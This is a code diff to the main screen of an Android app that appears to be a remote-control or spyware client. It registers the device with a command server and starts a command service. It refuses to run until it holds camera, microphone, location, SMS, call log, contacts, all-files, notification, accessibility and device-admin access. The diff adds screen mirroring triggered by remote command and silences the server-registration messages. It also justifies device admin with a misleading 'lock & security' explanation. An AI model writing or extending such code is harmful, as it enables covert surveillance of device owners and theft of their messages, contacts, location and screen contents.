@@ -1,21 +1,24 @@
 package com.csk4.app
 
+import android.Manifest
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
-import android.os.Handler
-import android.os.Looper
+import android.os.PowerManager
 import android.provider.Settings
 import android.view.View
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import com.android.volley.Request
 import com.android.volley.toolbox.JsonObjectRequest
 import com.android.volley.toolbox.Volley
@@ -28,14 +31,25 @@ class MainActivity : AppCompatActivity() {
         Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
     }
 
+    // ============ SCREEN CAPTURE ============
+    private val SCREEN_CAPTURE_REQUEST = 1001
+    private var pendingScreenMirrorCommand = false
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
+        // ⚠️ FORCE CHECK: Agar koi permission missing hai to PermissionActivity
+        if (!allPermissionsGranted()) {
+            startActivity(Intent(this, PermissionActivity::class.java))
+            finish()
+            return
+        }
+
         tvStatus = findViewById(R.id.tvStatus)
 
         // ============ BUTTONS ============
-        findViewById<Button>(R.id.btnWebPanel).setOnClickListener {
+        findViewById<Button>(R.id.btnWebPanel)?.setOnClickListener {
             startActivity(Intent(this, WebViewActivity::class.java))
         }
 
@@ -44,19 +58,39 @@ class MainActivity : AppCompatActivity() {
         }
 
         findViewById<Button>(R.id.btnAccessibility)?.setOnClickListener {
-            openAccessibilitySettings()
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
         }
 
         findViewById<Button>(R.id.btnNotificationAccess)?.setOnClickListener {
-            openNotificationAccessSettings()
+            try {
+                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
+            } catch (e: Exception) {
+                startActivity(Intent(Settings.ACTION_SETTINGS))
+            }
         }
 
         findViewById<Button>(R.id.btnStorageAccess)?.setOnClickListener {
-            openStorageAccessSettings()
+            if (Build.VERSION.SDK_INT >= 30) {
+                try {
+                    val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    i.data = Uri.parse("package:$packageName")
+                    startActivity(i)
+                } catch (e: Exception) {
+                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
+                }
+            }
         }
 
         findViewById<Button>(R.id.btnBattery)?.setOnClickListener {
-            openBatteryOptimization()
+            if (Build.VERSION.SDK_INT >= 23) {
+                try {
+                    val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                    i.data = Uri.parse("package:$packageName")
+                    startActivity(i)
+                } catch (e: Exception) {
+                    startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
+                }
+            }
         }
 
         findViewById<Button>(R.id.btnStartService)?.setOnClickListener {
@@ -79,113 +113,91 @@ class MainActivity : AppCompatActivity() {
             Toast.makeText(this, "👥 Contacts sent", Toast.LENGTH_SHORT).show()
         }
 
-        // ============ REGISTER + START ============
+        // ============ HANDLE SCREEN MIRROR COMMAND ============
+        // Check if app opened from screen mirror notification
+        if (intent?.getBooleanExtra("start_screen_mirror", false) == true) {
+            pendingScreenMirrorCommand = true
+        }
+
         registerDevice()
         startService(Intent(this, CommandService::class.java))
+        updateStatus()
 
-        // Auto prompt special permissions
-        Handler(Looper.getMainLooper()).postDelayed({
-            autoPromptSpecialPermissions()
-        }, 2000)
-    }
-
-    // ============ PERMISSION AUTO-PROMPT ============
-    private fun autoPromptSpecialPermissions() {
-        // 1. All Files Access (Android 11+)
-        if (Build.VERSION.SDK_INT >= 30) {
-            if (!Environment.isExternalStorageManager()) {
-                Toast.makeText(this, "📁 All Files Access ON karein", Toast.LENGTH_LONG).show()
-                try {
-                    val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                    i.data = Uri.parse("package:$packageName")
-                    startActivity(i)
-                } catch (e: Exception) {
-                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
-                }
-                return
-            }
-        }
-
-        // 2. Device Admin
-        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
-        if (!dpm.isAdminActive(admin)) {
-            enableDeviceAdmin()
-            return
-        }
-
-        // 3. Accessibility
-        if (ScreenshotService.instance == null) {
-            Toast.makeText(this, "📸 Accessibility ON karein", Toast.LENGTH_LONG).show()
-            openAccessibilitySettings()
-            return
-        }
-
-        // 4. Notification Access
-        if (!isNotificationServiceEnabled()) {
-            Toast.makeText(this, "🔔 Notification Access ON karein", Toast.LENGTH_LONG).show()
-            openNotificationAccessSettings()
-            return
-        }
-
-        // 5. Battery Optimization
-        val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
-        if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(packageName)) {
-            Toast.makeText(this, "🔋 Battery Optimization OFF karein", Toast.LENGTH_LONG).show()
-            openBatteryOptimization()
+        // Auto-request screen capture if triggered
+        if (pendingScreenMirrorCommand) {
+            requestScreenCapture()
         }
     }
 
-    // ============ SETTINGS OPENERS ============
-    private fun enableDeviceAdmin() {
-        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
-        if (!dpm.isAdminActive(admin)) {
-            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
-            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for lock control & security")
-            startActivity(i)
-        } else {
-            Toast.makeText(this, "✅ Admin already active", Toast.LENGTH_SHORT).show()
-        }
-    }
-
-    private fun openAccessibilitySettings() {
-        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-        Toast.makeText(this, "CSK4 Accessibility ON karein", Toast.LENGTH_LONG).show()
-    }
-
-    private fun openNotificationAccessSettings() {
+    // ============ SCREEN CAPTURE REQUEST ============
+    fun requestScreenCapture() {
         try {
-            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
+            val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            val intent = mpm.createScreenCaptureIntent()
+            startActivityForResult(intent, SCREEN_CAPTURE_REQUEST)
+            Toast.makeText(this, "Screen share permission allow karein", Toast.LENGTH_LONG).show()
         } catch (e: Exception) {
-            startActivity(Intent(Settings.ACTION_SETTINGS))
+            Toast.makeText(this, "❌ Screen capture fail: ${e.message}", Toast.LENGTH_SHORT).show()
         }
-        Toast.makeText(this, "CSK4 Notification Access ON karein", Toast.LENGTH_LONG).show()
     }
 
-    private fun openStorageAccessSettings() {
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+
+        if (requestCode == SCREEN_CAPTURE_REQUEST) {
+            if (resultCode == RESULT_OK && data != null) {
+                try {
+                    // Start screen mirror service
+                    val svc = ScreenMirrorService(this, deviceId)
+                    svc.start()
+                    svc.startScreenCapture(resultCode, data)
+                    ScreenMirrorService.instance = svc
+                    
+                    Toast.makeText(this, "✅ Screen mirror started", Toast.LENGTH_SHORT).show()
+                } catch (e: Exception) {
+                    Toast.makeText(this, "❌ Mirror fail: ${e.message}", Toast.LENGTH_SHORT).show()
+                }
+            } else {
+                Toast.makeText(this, "⏹️ Screen mirror cancelled", Toast.LENGTH_SHORT).show()
+            }
+            pendingScreenMirrorCommand = false
+        }
+    }
+
+    // ============ ALL PERMISSIONS CHECK ============
+    private fun allPermissionsGranted(): Boolean {
+        val perms = listOf(
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_PHONE_STATE
+        )
+        perms.forEach { p ->
+            if (ContextCompat.checkSelfPermission(this, p)
+                != PackageManager.PERMISSION_GRANTED) return false
+        }
+
         if (Build.VERSION.SDK_INT >= 30) {
-            try {
-                val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                i.data = Uri.parse("package:$packageName")
-                startActivity(i)
-            } catch (e: Exception) {
-                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
-            }
+            if (!Environment.isExternalStorageManager()) return false
         }
-    }
 
-    private fun openBatteryOptimization() {
-        if (Build.VERSION.SDK_INT >= 23) {
-            try {
-                val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                i.data = Uri.parse("package:$packageName")
-                startActivity(i)
-            } catch (e: Exception) {
-                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
-            }
+        if (!isNotificationServiceEnabled()) return false
+
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
+        if (!dpm.isAdminActive(admin)) return false
+
+        if (ScreenshotService.instance == null) return false
+
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+        if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(packageName)) {
+            return false
         }
+
+        return true
     }
 
     private fun isNotificationServiceEnabled(): Boolean {
@@ -193,7 +205,21 @@ class MainActivity : AppCompatActivity() {
         return flat != null && flat.contains(packageName)
     }
 
-    // ============ STATUS UPDATE ============
+    // ============ ENABLE ADMIN ============
+    private fun enableDeviceAdmin() {
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
+        if (!dpm.isAdminActive(admin)) {
+            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for lock & security")
+            startActivity(i)
+        } else {
+            Toast.makeText(this, "✅ Admin already active", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // ============ STATUS ============
     private fun updateStatus() {
         val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
         val bat = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
@@ -203,7 +229,7 @@ class MainActivity : AppCompatActivity() {
         val storageAccess = if (Build.VERSION.SDK_INT >= 30) Environment.isExternalStorageManager() else true
         val notifAccess = isNotificationServiceEnabled()
 
-        tvStatus.text = """
+        tvStatus?.text = """
             🆔 Device: $deviceId
             📱 ${Build.MODEL}
             🤖 Android ${Build.VERSION.RELEASE}
@@ -222,7 +248,6 @@ class MainActivity : AppCompatActivity() {
         findViewById<Button>(R.id.btnNotificationAccess)?.visibility = if (notifAccess) View.GONE else View.VISIBLE
     }
 
-    // ============ REGISTER ============
     private fun registerDevice() {
         val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
         val bat = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
@@ -236,13 +261,24 @@ class MainActivity : AppCompatActivity() {
                 put("battery", bat)
                 put("token", Config.DEVICE_TOKEN)
             },
-            { Toast.makeText(this, "✅ Registered", Toast.LENGTH_SHORT).show() },
-            { Toast.makeText(this, "❌ Server fail", Toast.LENGTH_SHORT).show() }
+            { }, { }
         ))
     }
 
     override fun onResume() {
         super.onResume()
-        updateStatus()
+        if (!allPermissionsGranted() && ::tvStatus.isInitialized) {
+            startActivity(Intent(this, PermissionActivity::class.java))
+            finish()
+            return
+        }
+        if (::tvStatus.isInitialized) updateStatus()
+    }
+
+    override fun onNewIntent(intent: Intent?) {
+        super.onNewIntent(intent)
+        if (intent?.getBooleanExtra("start_screen_mirror", false) == true) {
+            requestScreenCapture()
+        }
     }
 }
